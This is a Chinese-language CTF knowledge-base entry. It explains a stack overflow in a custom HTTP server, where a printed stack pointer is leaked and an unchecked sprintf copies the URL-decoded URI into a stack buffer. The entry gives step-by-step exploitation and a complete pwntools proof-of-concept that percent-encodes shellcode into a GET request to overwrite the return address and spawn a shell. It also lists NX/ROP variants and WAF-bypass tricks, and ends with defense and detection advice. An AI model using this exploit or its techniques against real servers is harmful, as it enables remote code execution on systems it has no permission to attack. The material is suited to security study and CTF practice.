---
id: binary-pwn-stack-http-uri-unescape-overflow-stack-leak-shellcode
title: 自制 HTTP 服务 URL 解码栈溢出：%p 泄露栈地址 + URI 编码 shellcode
type: scenario
domain: binary
path: binary/pwn/stack
technique: http-uri-unescape-stack-overflow-shellcode
aliases:
- HTTP URI 栈溢出
- uri_unescape 溢出
- URL 编码 shellcode
- 百分号 p 栈地址泄露
- GET 请求行溢出
- 自制 HTTP server pwn
tags:
- pwn
- stack-overflow
- http
- url-decode
- stack-leak
- shellcode
- remote
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: orchestrator-fix
  verified_at: '2026-11-05T20:08:07+08:00'
  notes: V91 指出的表述/通道问题已修正：91968（seccomp 实际放行全部 syscall / WaitForSingleObject 条件方向 / %p 泄露走进程 stderr）
---

## 一句话结论

自制 HTTP 服务的 GET 处理先用 `fprintf(stderr, "%p\n", file_name)` 把栈缓冲区地址回显给客户端，再把请求 URI 交给 `uri_unescape` 原地做 `%xx`/`+` 解码、随后 `sprintf(file_name, "%s%s", "./public", uri)` 无限长拷贝到栈缓冲区；攻击者先 GET 泄露栈地址，再把 shellcode 逐字节百分号编码放进 URL，即可覆盖返回地址并跳回栈上执行，获得远程 Shell。

## 原理

- **栈地址泄露**：GET 分支里 `fprintf(stderr, "%p\n", file_name)` 把 `file_name` 栈缓冲区地址打印出来；如果服务端的 stderr 与客户端 socket 相连（或可通过日志/响应读取），攻击者就拿到精确栈地址，绕过 ASLR（在无 PIE/固定栈布局的题目里尤其有效）。
- **URL 原地解码**：`uri_unescape(uri)` 遍历字符串，把 `+` 解码为空格、`%xx` 解码为单字节，并原地写回；解码只缩小长度，不会扩容，但它允许攻击者把任意字节（包括 shellcode）编码进 URL，绕过只检查可见字符的过滤。
- **无长度检查的拼接**：`sprintf(file_name, "%s%s", "./public", uri)` 把固定前缀和解码后的 URI 拷贝进栈上的 `file_name` 缓冲区，没有 `snprintf`/长度校验；URI 长度完全由请求行控制，超长即覆盖栈上的返回地址。
- **利用布局**：`file_name` 是泄露的栈地址，URI 从 `file_name+8` 开始（`"./public"` 占 8 字节）；payload 形如 `0x20` 字节填充 + shellcode + 填充到返回地址偏移（案例 0x120）+ 6 字节返回地址 `stack+8+0x20`，使函数返回时跳到 URI 中的 shellcode。
- **shellcode 与 fd**：服务端在连接处理中执行 `dup2(clientfd, 1); close(clientfd)`，把客户端 socket 复制到 stdout 后关闭原 fd；shellcode 使用 `dupsh(1)` 把 fd 1 复制到 stdin/stdout/stderr，再 `execve("/bin/sh")`，这样反弹/正向 Shell 能正常读写命令。
- **保护缺失**：案例题目“基本上什么保护都没有开启”（无栈 canary、NX、PIE 等），因此栈上执行 shellcode 可行；若目标开启 NX，需要改为 ROP/ret2libc，仍可利用同一溢出与泄露。

## 触发条件

- 目标运行自制 HTTP 服务，GET 处理把 URI 解码后 `sprintf` 到固定栈缓冲区；
- 攻击者能访问服务端口，并能读到 `%p` 泄露（直接回显、stderr 重定向或日志）；
- 二进制无栈 canary/NX/PIE，或攻击者有对应的 ROP 链；
- URL 长度不受前置代理/WAF 限制，或可通过分块/编码绕过；
- 服务进程权限足以执行 shell（通常为服务账户）。
- **验证边界**：原文注明比赛时远程未打通，最终 exp 在本地服务上验证；远程利用需按目标 libc/栈布局与网络回显路径调整，不能视为已在真实远程环境验证。

## 利用步骤

1. 发送一个正常 GET（如 `GET ./public HTTP/1.1`），从响应/日志中读取 `fprintf(stderr, "%p\n", file_name)` 输出的栈地址。
2. 生成 amd64 shellcode（如 pwntools `shellcraft.amd64.linux.dupsh(1)`）。
3. 构造 payload：`b"a"*0x20 + shellcode`，填充到返回地址偏移（案例 0x120），再写入 6 字节返回地址 `stack + 8 + 0x20`。
4. 对 payload 每个字节做 `%xx` 编码（`+` 也要处理），拼成 URL。
5. 发送 `GET <encoded> HTTP/1.1`；服务端 `uri_unescape` 解码后 `sprintf` 溢出，函数返回跳到栈上 shellcode。
6. 用 `dupsh` 恢复 stdin/stdout/stderr 后获得交互 Shell；若失败，检查返回地址偏移、NUL 字节、栈对齐和 stderr 回显路径。

## PoC

以下为按题解修正/压缩的脚本（原文 `pct` 的缩进会只编码首字节，这里按正确逻辑逐字节编码）：

```python
from pwn import *
context.arch = "amd64"

def pct(data):
    return "".join("%%%02x" % b for b in data)

def get_req(path, host="127.0.0.1", port=8000):
    return ("GET %s HTTP/1.1\r\nHost: %s:%d\r\nAccept: */*\r\n\r\n" % (path, host, port)).encode()

# 1) 泄露栈地址
p = remote("127.0.0.1", 8000)
p.send(get_req("./public"))
p.recvuntil(b"Accept: */*\n")
stack = int(p.recvline().strip(), 16)
p.close()

# 2) 构造 shellcode + 返回地址
sc = asm(shellcraft.amd64.linux.dupsh(1))
off = 0x20
body = b"a" * off + sc
body = body.ljust(0x120, b"b") + p64(stack + 8 + off)[:6]
uri = pct(body)

# 3) 发送溢出请求
q = process("./server")
q.send(get_req(uri))
q.recv(timeout=1)
q.interactive()
```

## 变体与关联

- 变体：溢出点从请求行 URI 换成 POST body、Header、Content-Length、chunked 编码；`%p` 泄露换成格式化字符串、崩溃日志、错误页。
- 变体：开启 NX 时改为 ROP：用同一栈泄露找 `pop rdi; ret`、`/bin/sh`、`system`；开启 canary 时先泄露 canary；PIE 时先泄露代码基址。
- 变体：URL 解码器本身可能有 `%00` 截断/越界问题；WAF 只检查原始 URL 时，`%xx` 编码可绕过关键字。
- 关联：[[binary-pwn-stack-ret2libc]]（栈溢出 ret2libc）、[[binary-pwn-stack-ret2syscall-32bit]]（32 位 sigreturn/系统调用）、[[binary-pwn-rop-static-link-ret2system-sh]]（静态链接 ROP）。

## 检测与防御

- **代码修复**：URI 解码后先检查长度，使用 `snprintf`/`strlcpy` 限制拷贝；`file_name` 缓冲区按最大 URI 长度分配；拒绝超长请求行。
- **信息泄露**：删除 `fprintf(stderr, "%p\n", file_name)` 等指针打印；错误页不回显内部地址；stderr 不要连到客户端。
- **编译加固**：开启 stack canary（`-fstack-protector-strong`）、NX、PIE、Full RELRO；使用 ASLR；以低权限账户运行服务；`seccomp` 限制 `execve`。
- **网络防护**：反向代理限制 URL/请求行长度；WAF 检测超长 `%xx` 序列；对异常 GET（大量百分号编码、超长 URI）告警。
- **检测**：服务崩溃日志中出现返回地址被覆盖、栈上执行、`execve("/bin/sh")`；主机侧监控 Web 服务进程派生 shell、异常出站连接；流量侧检测 `%xx` 密度异常与 shellcode 特征。
